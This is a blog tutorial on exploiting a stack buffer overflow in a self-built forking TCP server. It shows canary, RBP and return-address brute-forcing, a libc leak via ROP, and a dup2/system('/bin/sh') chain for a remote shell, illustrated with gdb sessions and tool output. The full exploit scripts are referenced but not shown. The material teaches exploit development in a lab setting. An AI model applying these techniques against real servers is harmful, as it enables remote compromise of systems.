@@ -1,0 +1,454 @@
+Previously we saw how we can [leak libc addresses from GOT](https://ret2rop.blogspot.com/2020/04/got-address-leak-exploit-unknown-libc.html) to exploit unknown libc version. But we had stack canary and PIE (position independent executable) disabled. This time we will see how we can defeat all these protections too in a server. Checkout this server code. It's a very simple tcp server, which reads a message from client, may be process it and it can also serve many clients simultaneously by forking child processes, with each child serving each client. This one's not very efficient but many actual servers follow a similar multi processed and also multi-threaded approach just much more efficiently.
+
+Compile it without any flags.
+
+```
+gcc version 9.3.0
+$ gcc msg_server.c -o msg_server
+```
+
+Notice how we have all the default protections on now.
+
+```
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : Partial
+```
+
+You can run it with
+
+```
+$ ./msg_server 8888
+[i] Listening on PORT 8888, sfd is 3
+```
+
+Try connecting it with netcat.
+
+```
+$ nc 127.0.0.1 8888 -v
+localhost [127.0.0.1] 8888 (ddi-tcp-1) open
+Enter message: hello server
+Request complete, Closing...
+```
+
+On server side you will see.
+
+```
+$ ./msg_server 8888
+[i] Listening on 0.0.0.0:8888, sfd is 3
+[*] Accepted, cfd 4 from 127.0.0.1:51306, pid: 106227
+```
+
+You can also try connecting from multiple clients at the same time.
+
+In the disassembly graph view from IDA below, you can see that after accepting the connection, the server forks a child process which first prints some info about the client connection and then calls the '`handle_request`' function with the client socket file descriptor to handle the request from client.
+
+[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQOjYzNsNKTWfjEaSKWvIzjBg5Yk9crI-3Apn7ILGK78bp7mZPyF5fbQZ4-nkFwe-D486l8nasXaVsdtKQ-bvJWzysPNtzajf979SoDeBYQSihod_qxagYhYQFB5SX__Ai1_4i8D59wYY/d/Screenshot_20200530_004359.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQOjYzNsNKTWfjEaSKWvIzjBg5Yk9crI-3Apn7ILGK78bp7mZPyF5fbQZ4-nkFwe-D486l8nasXaVsdtKQ-bvJWzysPNtzajf979SoDeBYQSihod_qxagYhYQFB5SX__Ai1_4i8D59wYY/)
+
+If you are not familiar with `fork` syscall, you can read more about it on its man page (`man 2 fork`) or online. Basically it creates a new child process which is exact duplicate of parent process except for a few points and they both run on separate memory spaces.
+
+  
+
+In `handle_request` function, we can see that it can read up to 1024 bytes from client but it stores it in just a buffer of 200 bytes. Clearly it has buffer overflow vulnerability, but stack canary is enabled, which is placed just after the buffer, so if the buffer overflows, the stack canary will be overwritten and there's a test before the function returns to check the integrity of stack canary, which will fail and program will safely terminate with message "`stack smashing detected`".
+
+[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgh_-G835WGEGCeZnellrDW2J8nEDoNcLVDognWHxbFk4qbKA18S_Jh0pWEBLPTMCJ36XL6HkWoZR_1H3c13iybLNixJRTRH-WjWZD6AUeCCa16idF2lKNaLC8PTiRY2h1XCq9qaZNDaVM/d/Screenshot_20200530_015137.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgh_-G835WGEGCeZnellrDW2J8nEDoNcLVDognWHxbFk4qbKA18S_Jh0pWEBLPTMCJ36XL6HkWoZR_1H3c13iybLNixJRTRH-WjWZD6AUeCCa16idF2lKNaLC8PTiRY2h1XCq9qaZNDaVM/)
+
+So even if we overflow the buffer the program will terminate because of stack canary violation.
+
+## Partial Overwrite
+
+As we know the canary is placed just after the buffer, so first 200 bytes will be buffer space and Canary will start from 201st byte. Now if we send payload of 201 bytes, it will just overwrite first byte of canary while leaving the remaining intact. Though the stack check will fail cause canary is modified.
+
+We can try and see ourselves. Let's load the binary in gdb and `set follow-fork-mode child` so that gdb automatically attaches to child process on fork since buffer overflow is in handle request function which is executed in child process. If you want to follow parent you can set it to `parent`. You can also attach to child process from gdb if it's running (you may require higher privileges to attach to process or check `ptrace_scope`) with `attach` or `at` followed by pid of process. Set breakpoint where stack canary is checked (at xor instruction), and run the program. 
+
+```
+$ gdb msg_server -q
+Reading symbols from msg_server...
+(No debugging symbols found in msg_server)
+gdb-peda$ set follow-fork-mode child
+gdb-peda$ disas handle_request 
+Dump of assembler code for function handle_request:
+   0x0000000000001269 <+0>:	push   rbp
+   0x000000000000126a <+1>:	mov    rbp,rsp
+   0x000000000000126d <+4>:	sub    rsp,0xf0
+   0x0000000000001274 <+11>:	mov    DWORD PTR [rbp-0xe4],edi
+   0x000000000000127a <+17>:	mov    rax,QWORD PTR fs:0x28
+   0x0000000000001283 <+26>:	mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000001287 <+30>:	xor    eax,eax
+   0x0000000000001289 <+32>:	movabs rax,0x656d207265746e45
+   0x0000000000001293 <+42>:	movabs rdx,0x203a6567617373
+   0x000000000000129d <+52>:	mov    QWORD PTR [rbp-0xe0],rax
+   0x00000000000012a4 <+59>:	mov    QWORD PTR [rbp-0xd8],rdx
+   0x00000000000012ab <+66>:	lea    rax,[rbp-0xe0]
+   0x00000000000012b2 <+73>:	mov    rdi,rax
+   0x00000000000012b5 <+76>:	call   0x1080 <strlen@plt>
+   0x00000000000012ba <+81>:	mov    rdx,rax
+   0x00000000000012bd <+84>:	lea    rcx,[rbp-0xe0]
+   0x00000000000012c4 <+91>:	mov    eax,DWORD PTR [rbp-0xe4]
+   0x00000000000012ca <+97>:	mov    rsi,rcx
+   0x00000000000012cd <+100>:	mov    edi,eax
+   0x00000000000012cf <+102>:	call   0x1060 <write@plt>
+   0x00000000000012d4 <+107>:	lea    rcx,[rbp-0xd0]
+   0x00000000000012db <+114>:	mov    eax,DWORD PTR [rbp-0xe4]
+   0x00000000000012e1 <+120>:	mov    edx,0x400
+   0x00000000000012e6 <+125>:	mov    rsi,rcx
+   0x00000000000012e9 <+128>:	mov    edi,eax
+   0x00000000000012eb <+130>:	call   0x10d0 <read@plt>
+   0x00000000000012f0 <+135>:	nop
+   0x00000000000012f1 <+136>:	mov    rax,QWORD PTR [rbp-0x8]
+   0x00000000000012f5 <+140>:	xor    rax,QWORD PTR fs:0x28        ; canary is checked here
+   0x00000000000012fe <+149>:	je     0x1305 <handle_request+156>
+   0x0000000000001300 <+151>:	call   0x1090 <__stack_chk_fail@plt>
+   0x0000000000001305 <+156>:	leave  
+   0x0000000000001306 <+157>:	ret    
+End of assembler dump.
+gdb-peda$ b *handle_request+140             # set breakpoint at check
+Breakpoint 1 at 0x12f5
+gdb-peda$ r
+Starting program: /home/archer/compiler_tests/msg_server 
+[i] Listening on 0.0.0.0:8888, sfd is 3
+```
+
+Now let's send a payload of 201 bytes to see the overwrite. 200 bytes of 'A' and overwrite a byte with 'B' (0x42). I will be sending payload with the help of python sockets.
+
+[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbh4QAvanBOg6Cj1lWhDBuM9Lj7cHvSz2VgMD0zpiYMJweBDaz6WVg_0dBfEb5ACG-zoiaaAefMRPd2tR6LddwM35HowXOPvML9P0MzcRHIRo9oAFXvXkra86kbWWAmevl0DicsWySTlY/s320/20200510_090510.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbh4QAvanBOg6Cj1lWhDBuM9Lj7cHvSz2VgMD0zpiYMJweBDaz6WVg_0dBfEb5ACG-zoiaaAefMRPd2tR6LddwM35HowXOPvML9P0MzcRHIRo9oAFXvXkra86kbWWAmevl0DicsWySTlY/s696/20200510_090510.jpg)
+
+After running it with `python 3` you will see the following. The stack canary is in rax and its first byte contains 42, that means we overwrote first byte of canary with 'B'. If you continue you will see program terminates with message, "stack smashing detected".
+
+```
+[Attaching after process 566648 fork to child process 566654]
+[New inferior 2 (process 566654)]
+[Detaching after fork from parent process 566648]
+[Inferior 1 (process 566648) detached]
+[*] Accepted, cfd 4 from 192.168.0.6:46268, pid: 566654
+[Switching to process 566654]
+[----------------------------------registers-----------------------------------]
+RAX: 0x8564c5f6ec932442       <== stack canary overwritten by 42(B)
+RBX: 0x0 
+RCX: 0x7ffff7eadab2 (<read+18>:	cmp    rax,0xfffffffffffff000)
+RDX: 0x400 
+RSI: 0x7fffffffdb10 ('A' <repeats 200 times>...)
+RDI: 0x4 
+RBP: 0x7fffffffdbe0 --> 0x7fffffffdc90 --> 0x5555555555e0 (<__libc_csu_init>:	endbr64)
+RSP: 0x7fffffffdaf0 --> 0x0 
+RIP: 0x5555555552f5 (<handle_request+140>:	xor    rax,QWORD PTR fs:0x28)
+R8 : 0x0 
+R9 : 0x38 ('8')
+R10: 0x555555554602 --> 0x7465730064616572 ('read')
+R11: 0x246 
+R12: 0x555555555170 (<_start>:	endbr64)
+R13: 0x0 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x5555555552eb <handle_request+130>:	call   0x5555555550d0 <read@plt>
+   0x5555555552f0 <handle_request+135>:	nop
+   0x5555555552f1 <handle_request+136>:	mov    rax,QWORD PTR [rbp-0x8]
+=> 0x5555555552f5 <handle_request+140>:	xor    rax,QWORD PTR fs:0x28
+   0x5555555552fe <handle_request+149>:	je     0x555555555305 <handle_request+156>
+   0x555555555300 <handle_request+151>:	call   0x555555555090 <__stack_chk_fail@plt>
+   0x555555555305 <handle_request+156>:	leave  
+   0x555555555306 <handle_request+157>:	ret
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdaf0 --> 0x0 
+0008| 0x7fffffffdaf8 --> 0x400000000 
+0016| 0x7fffffffdb00 ("Enter message: ")
+0024| 0x7fffffffdb08 --> 0x203a6567617373 ('ssage: ')
+0032| 0x7fffffffdb10 ('A' <repeats 200 times>...)
+0040| 0x7fffffffdb18 ('A' <repeats 192 times>, "B$\223\354\366\305d\205"...)
+0048| 0x7fffffffdb20 ('A' <repeats 184 times>, "B$\223\354\366\305d\205\220\334\377\377\377\177")
+0056| 0x7fffffffdb28 ('A' <repeats 176 times>, "B$\223\354\366\305d\205\220\334\377\377\377\177")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Thread 2.1 "msg_server" hit Breakpoint 1, 0x00005555555552f5 in handle_request ()
+gdb-peda$ c
+Continuing.
+*** stack smashing detected ***: terminated
+
+Thread 2.1 "msg_server" received signal SIGABRT, Aborted.
+```
+
+If we want to pass the check we need to guess the byte correctly. A byte can vary from `0x00` to `0xff` i.e. 256 values. That means we can brute-force the value in at most 256 tries.
+
+But there may be a problem in that, whenever stack check fails, `__stack_chk_fail` function is called which safely terminates the process. Now usually when that process is run again, it will have a new canary, rendering our brute-force attempts useless.
+
+## Brute-forcing bytes
+
+As we know, in our case the server is listening on main parent process and then forks a duplicate child process to handle the request. Since buffer overflow will occur in child process when it's handling the request, only the child process gets terminated on stack canary violation, meanwhile the parent process keeps listening for new connections and forks a new child process for new connections. And since child is duplicate of parent it will always have same canary.
+
+So this way we can keep brute-forcing for new values and if we hit the correct byte, the process will continue normally i.e. send response message and close the connection properly which can be used to identify if we sent correct value. We can do the same for next byte and ones after that till we have whole 8 byte stack canary. We will require at most `256*8 = 2048` attempts. Seems a lot but it isn't really that much and also most of the times we won't have to search through all 256 values.
+
+## Optimising brute-force for Canary
+
+We can further optimise the brute-force by looking at pattern in which stack canary changes. Try running the program multiple times, not overflowing the buffer, set breakpoint and check the stack canary. Few examples below.
+
+```
+0xc5e1de93dc0f3c00
+0xa276c81bfbeefe00
+0x09368174f1139400
+0x8564c5f6ec932400
+0x6b420d65bbf27d00
+0x847149724750a000
+```
+
+You will notice that it always ends with `00` (from left). A null byte. So we can reduce brute-force from 8 to 7 bytes (256 less attempts). This is actually intentional because, `null` is a terminating byte for many functions, so it can prevent further payload from overflow. But since our application uses `read` function to read data, this isn't a problem for us.
+
+  
+
+We have leaked Canary, but to exploit further we need some rop gadgets. [Previously](https://ret2rop.blogspot.com/2020/04/got-address-leak-exploit-unknown-libc.html) we used rop gadgets in the binary itself to first leak libc addresses, and for that we needed to know address of gadgets in binary. But in this case the binary is `Position Independent Executable`, so the address space of binary itself will also be randomised by ASLR.
+
+Next things we can see on stack after canary are 8 bytes RBP which is an address from stack and 8 bytes return address which is an address from binary itself. Hence we can leak address from stack and the binary, and with address from binary we can calculate addresses of rop gadgets in the binary, bypassing PIE. We can bruteforce these the same way we did stack canary, trying byte by byte and seeing when the server continues normally.
+
+## Optimising brute-force for RBP and Return Address
+
+We will again look for patterns. Since RBP is from stack we will look for patterns in stack addresses and in binary addresses for return addresses. You can turn on ASLR inside gdb with command `aslr on`. Now you can start execution again and again and look for patterns. 
+
+```
+gdb-peda$ aslr on
+```
+
+After running a few times you will notice.
+
+1.  ) **RBP** - Look into the stack part. The first 3 bytes '`00 00 7f`' (from left) in 8 bytes address never change. The fourth byte changes in range '`fc`' to '`ff`'. Cool, we just have to brute-force now for at most `4 + 256*4 = 1028` values for RBP.  
+      
+2.  ) **Return Address** - Look into the code part. The first 2 bytes '`00 00`' (from left) in 8 bytes address remain constant. And the third byte changes from '`55`' to '`56`'. Now the maximum tries for return address are reduced to `2 + 256*5 = 1282` . We can actually decrease this even further. The `handle_request` is called from the `main` function in binary. And after executing it returns back to the `main` function. So the return address will always be to the next instruction from where `handle_request` was called. And even though `PIE` is on, the binary and all sections are always loaded aligned to the page size i.e. `0x1000` as we learned in [previous](https://ret2rop.blogspot.com/2020/04/got-address-leak-exploit-unknown-libc.html) article. Hence the last 3 characters (nibbles)/1.5 bytes of return address will also always be same. Now the max tries will be `2 + 256*3 + 16 = 786`.
+
+To get the return address find the address in `main` after `handle_request` call.
+
+```
+gdb-peda$ disas main
+Dump of assembler code for function main:
+.
+.
+0x000000000000154d <+582>:	call   0x1269 <handle_request>
+0x0000000000001552 <+587>:	movabs rax,0x2074736575716572
+               ^^^== return address
+```
+
+So '`552`' will be constant in return address. It might be different in your executable so find it for yours.
+
+## Writing Bruteforce Script
+
+So here's the basic plan.
+
+1.  ) Overflow the buffer.
+2.  ) Bruteforce byte by byte for Canary, RBP and return address.
+3.  ) Check response for each attempt, if response is correct, use that value and start bruteforcing next byte.
+4.  ) Just use the constant values we found earlier in their respective places.
+5.  ) Do till whole 8 byte canary/address is found.
+6.  ) Subtract offset of return address from leaked return address to get base address of binary.
+
+Here I have implemented a multi threaded code to speed up the process. Basically it does the same thing as mentioned in above steps. Read comments for more understanding. The number of threads depends on specifications of the machine the server is running on. As it creates a lot of processes, it can easily fill up memory and cpu usage especially if server is running in a VM. I can easily do full \>256 threads on a dedicated machine but they need to be reduced if testing against a VM. So monitor usage and choose accordingly. Change the offset to return address and its constants accordingly and run. It takes 5-10 seconds to brute-force all three on my machine.
+
+## Leaking Libc Addresses and identifying libc version
+
+Since we have base address of binary now and have successfully bypassed PIE, we can now use rop gadgets in binary itself to leak libc addresses. We will follow same process as [previous article](https://ret2rop.blogspot.com/2020/04/got-address-leak-exploit-unknown-libc.html) so you can read it in more detail [here](https://ret2rop.blogspot.com/2020/04/got-address-leak-exploit-unknown-libc.html).
+
+So basically last time, we used `printf` from the binary itself with proper arguments to leak libc addresses from global offset table. Similarly we can use `write` function available in this binary. `write` takes 3 arguments -
+
+1.  file descriptor.
+2.  source buffer address.
+3.  number of bytes to read from buffer to fd.
+
+Basically in linux everything is a file, and file descriptor can be used to access that file. Our client and server communicate using sockets, and these sockets can be accessed using their file descriptors. So in order to `write` to client we need file descriptor of the corresponding socket. You can read more about file descriptors online. In our case we can see it printed on server side as '`cfd 4`'. You will notice that it's always '4' for all clients here, that's because the server forks a duplicate child process for each client, and then '4' fd is closed in the parent process and again assigned on new connection. Since each child process is duplicated from parent, each gets cfd as '4'.
+
+We can also get the file descriptor by setting a break point when `write` is called to send response to child and reading the first argument in `rdi` register.
+
+### Calling write with rop
+
+We need to get 3 arguments for `write` into `rdi,rsi` and `rdx` registers. Let's find gadgets in binary to do so.
+
+```
+$ ROPgadget --binary msg_server | grep "pop rdi"
+0x0000000000001643 : pop rdi ; ret
+$ ROPgadget --binary msg_server | grep "pop rsi"
+0x0000000000001641 : pop rsi ; pop r15 ; ret
+$ ROPgadget --binary msg_server | grep "rdx"
+0x0000000000001011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
+```
+
+I found `pop rdi` and `pop rsi`, but unfortunately couldn't find any gadget to load rdx. But `rdx` just needs to specify number of bytes to read from buffer(which will be pointing to GOT). If we already have some good value in `rdx` before our rop chain is executed, we won't need to load it explicitly. So let's check what are the values in registers just before `handle_request` returns.
+
+```
+   0x0000000000001305 <+156>:	leave  
+   0x0000000000001306 <+157>:	ret    
+End of assembler dump.
+gdb-peda$ b *handle_request +157
+Breakpoint 1 at 0x1306
+gdb-peda$ r
+Starting program: /home/archer/compiler_tests/msg_server 
+[i] Listening on 0.0.0.0:8888, sfd is 3
+[Attaching after process 394793 fork to child process 394798]
+[New inferior 2 (process 394798)]
+[Detaching after fork from parent process 394793]
+[Inferior 1 (process 394793) detached]
+[*] Accepted, cfd 4 from 192.168.0.6:54926, pid: 394798
+[Switching to process 394798]
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x7f62eb5a8ab2 (<read+18>:	cmp    rax,0xfffffffffffff000)
+RDX: 0x400          <== 1024 bytes will work
+RSI: 0x7fff132fa4c0 ('A' <repeats 200 times>)
+RDI: 0x4            <== already has client socket file desciptor
+RBP: 0x7fff132fa640 --> 0x556ea1f015e0 (<__libc_csu_init>:	endbr64)
+RSP: 0x7fff132fa598 --> 0x556ea1f01552 (<main+587>:	movabs rax,0x2074736575716552)
+RIP: 0x556ea1f01306 (<handle_request+157>:	ret)
+R8 : 0x0 
+R9 : 0x38 ('8')
+R10: 0x556ea1f00602 --> 0x7465730064616572 ('read')
+R11: 0x246 
+R12: 0x556ea1f01170 (<_start>:	endbr64)
+R13: 0x0 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x556ea1f012fe <handle_request+149>:	je     0x556ea1f01305 <handle_request+156>
+   0x556ea1f01300 <handle_request+151>:	call   0x556ea1f01090 <__stack_chk_fail@plt>
+   0x556ea1f01305 <handle_request+156>:	leave  
+=> 0x556ea1f01306 <handle_request+157>:	ret    
+   0x556ea1f01307 <main>:	push   rbp
+   0x556ea1f01308 <main+1>:	mov    rbp,rsp
+   0x556ea1f0130b <main+4>:	sub    rsp,0xa0
+   0x556ea1f01312 <main+11>:	mov    DWORD PTR [rbp-0x94],edi
+[------------------------------------stack-------------------------------------]
+0000| 0x7fff132fa598 --> 0x556ea1f01552 (<main+587>:	movabs rax,0x2074736575716552)
+0008| 0x7fff132fa5a0 --> 0x7fff132fa738 --> 0x7fff132fc1bb ("/home/archer/compiler_tests/msg_server")
+0016| 0x7fff132fa5a8 --> 0x100000000 
+0024| 0x7fff132fa5b0 --> 0x100000000 
+0032| 0x7fff132fa5b8 --> 0x22b800000010 
+0040| 0x7fff132fa5c0 --> 0x400000003 
+0048| 0x7fff132fa5c8 --> 0xd68e00000000 
+0056| 0x7fff132fa5d0 --> 0xb8220002 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Thread 2.1 "msg_server" hit Breakpoint 1, 0x0000556ea1f01306 in handle_request ()
+gdb-peda$
+```
+
+There's already `0x400` in `rdx`, means it will read `1024` bytes from GOT and send it to client. We can work with that. We will also leak multiple libc addresses from GOT this way to identify the libc version. You can also notice that `rdi` also already has client socket descriptor '4', before it will enter rop chain, so we don't need to use `pop rdi` to load it again.  
+We can find out that after got entry of write, getpid and other functions are there in order that can be seen below. So the first `8` bytes from leaked `1024` bytes will be libc address of `write`, then next 8 bytes `getpid` and so on.
+
+```
+$ gdb msg_server -q
+Reading symbols from msg_server...
+(No debugging symbols found in msg_server)
+gdb-peda$ info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x0000000000001030  inet_ntop@plt
+0x0000000000001040  puts@plt
+0x0000000000001050  setsockopt@plt
+0x0000000000001060  write@plt
+0x0000000000001070  getpid@plt
+0x0000000000001080  strlen@plt
+0x0000000000001090  __stack_chk_fail@plt
+0x00000000000010a0  htons@plt
+0x00000000000010b0  printf@plt
+0x00000000000010c0  close@plt
+0x00000000000010d0  read@plt
+0x00000000000010e0  signal@plt
+0x00000000000010f0  listen@plt
+0x0000000000001100  ntohs@plt
+0x0000000000001110  bind@plt
+0x0000000000001120  accept@plt
+0x0000000000001130  atoi@plt
+0x0000000000001140  exit@plt
+0x0000000000001150  fork@plt
+0x0000000000001160  socket@plt
+0x0000000000001170  _start
+0x00000000000011a0  deregister_tm_clones
+0x00000000000011d0  register_tm_clones
+0x0000000000001210  __do_global_dtors_aux
+0x0000000000001260  frame_dummy
+0x0000000000001269  handle_request
+0x0000000000001307  main
+0x00000000000015e0  __libc_csu_init
+0x0000000000001650  __libc_csu_fini
+0x0000000000001658  _fini
+gdb-peda$ disas 0x0000000000001060
+Dump of assembler code for function write@plt:
+   0x0000000000001060 <+0>:	jmp    QWORD PTR [rip+0x2fca]        # 0x4030 <write@got.plt>
+   0x0000000000001066 <+6>:	push   0x3
+   0x000000000000106b <+11>:	jmp    0x1020
+End of assembler dump.
+gdb-peda$ x/gx 0x4030
+0x4030 <write@got.plt>:	0x0000000000001066
+gdb-peda$ 
+0x4038 <getpid@got.plt>:	0x0000000000001076
+gdb-peda$ 
+0x4040 <strlen@got.plt>:	0x0000000000001086
+gdb-peda$ 
+0x4048 <__stack_chk_fail@got.plt>:	0x0000000000001096
+gdb-peda$
+```
+
+Add the following script to previous brute-force script. Run whole script after adding. I have put the leaked return address at last so the program continues normally after executing rop chain. (Btw you don't have to bruteforce all again and again, you can just use the leaked values and continue)
+
+```
+$ python brute_address.py 192.168.0.8 8888
+Leaking CANARY:	0x40d4c335a6559000  
+Leaking RBP:	0x00007ffec5e51c90   
+Leaking RET:	0x000055ae37ba9552   
+[*] Binary base calculated:	 0x55ae37ba8000
+b'@\x80J|~\x7f\x00\x00\xb0\xe0G|~\x7f\x00\x00\xd0$R|~\x7f\x00\x00p\x99L|~\x7f\x00\x00\xd0\x99L|~\x7f\x00\x00\x10\xbe?|~\x7f\x00\x00\xe0\x87J|~\x7f\x00\x00\xa0\x7fJ|~\x7f\x00\x00\x80\xd0=|~\x7f\x00\x00\x90\xa2K|~\x7f\x00\x00\xd0\x99L|~\x7f\x00\x000\xa1K|~\x7f\x00\x00\x90\xa0K|~\x7f\x00\x000\xe7=|~\x7f\x00\x00\xc0\x0b>|~\x7f\x00\x00\xe0\xceG|~\x7f\x00\x00'
+[*] Leaked libc write:	 0x7f7e7c4a8040
+[*] Leaked libc getpid:	 0x7f7e7c47e0b0
+Request complete, Closing...
+*** Connection closed by remote host ***
+```
+
+Now we can use these leaked libc addresses to identify libc version of remote machine from libc database. I'm using [libc.nullbyte.cat](https://libc.nullbyte.cat/). Querying last 3 characters from leaks give me the libc version:
+
+[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsFEJoKUQFGCHnQy3i7_eY8A6Ru4oOKOQNFqueDSMJASARtnIWCd26vpGKzoX5ODFYSGmgNW934lfW_goCZxLUgm7wRciRinTMZdZ_X6WJUNCWOlqmWeU1R67Thm6C0DHJDAkBwACQnZw/d/Screenshot_20200606_033939.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsFEJoKUQFGCHnQy3i7_eY8A6Ru4oOKOQNFqueDSMJASARtnIWCd26vpGKzoX5ODFYSGmgNW934lfW_goCZxLUgm7wRciRinTMZdZ_X6WJUNCWOlqmWeU1R67Thm6C0DHJDAkBwACQnZw/s1153/Screenshot_20200606_033939.png)
+
+Now we can use offset of `write` to get libc base address.
+
+## Getting an interactive shell
+
+Next we can do return to libc to execute `system('/bin/sh');`. But if you will execute just like that, you will see that the shell is executed on server side, and you as a client can't interact with it because the shell is reading from `stdin` and outputting to `stdout` on server and you can just interact with server on client socket with file desciptor `cfd`.
+
+As we know in linux everything is a file, therefore `stdin`, `stdout` and `stderr` are also files with default file descriptors `0`, `1` and `2` respectively. And linux also provides a syscall to duplicate a file descriptor. You can read its man page.
+
+```
+$ man 2 dup2
+NAME
+       dup, dup2, dup3 - duplicate a file descriptor
+SYNOPSIS
+       #include <unistd.h>
+       int dup(int oldfd);
+       int dup2(int oldfd, int newfd);
+DESCRIPTION
+       The  dup() system call creates a copy of the file descriptor oldfd,
+       using the lowest-numbered unused file descriptor for the new descriptor.
+
+       After a successful return, the old and new file descriptors may be
+       used  interchangeably.  They refer to the same open file description
+       (see open(2)) and thus share file offset and file status flags...
+```
+
+So basically we can use `cfd` as `stdin`, `stdout` and `stderr`. And we have to call `dup2` in this way.
+
+```
+dup2(4, 0);
+dup2(4, 1);
+dup2(4, 2);
+system("/bin/sh");
+```
+
+So here's what the full final exploit code for `python 3` would look like. I again haven't used `pop rdi` to load `cfd '4'` into rdi because it was already available in rdi. Run after making appropriate changes according to your binary and target libc. Here's my output run, takes about 10 seconds. If you did correctly you will get an interactive shell, else try to debug, you can try attaching to process and see where it's going wrong.  
+This time we saw how we can defeat PIE and stack canary by using byte wise brute-force in reasonable time (just few seconds-minutes depending on server) and also how to reduce time even more by finding patterns. Then leaked libc addresses to find libc version and craft a final rop chain to get a shell and saw how to duplicate file descriptors to get shell over sockets. Though it was particular to the server type where application isn't totally restarted. We also saw that we can even partially overwrite addresses like return address and that can sometimes be used for further leaks in PIE environment.
+
+  
+If you have any queries or suggestions do leave a comment. Or you can directly [contact me](https://ret2rop.blogspot.com/p/contact.html).
+
+Also Read: [Make Stack Executable Again](https://ret2rop.blogspot.com/2018/08/make-stack-executable-again.html).
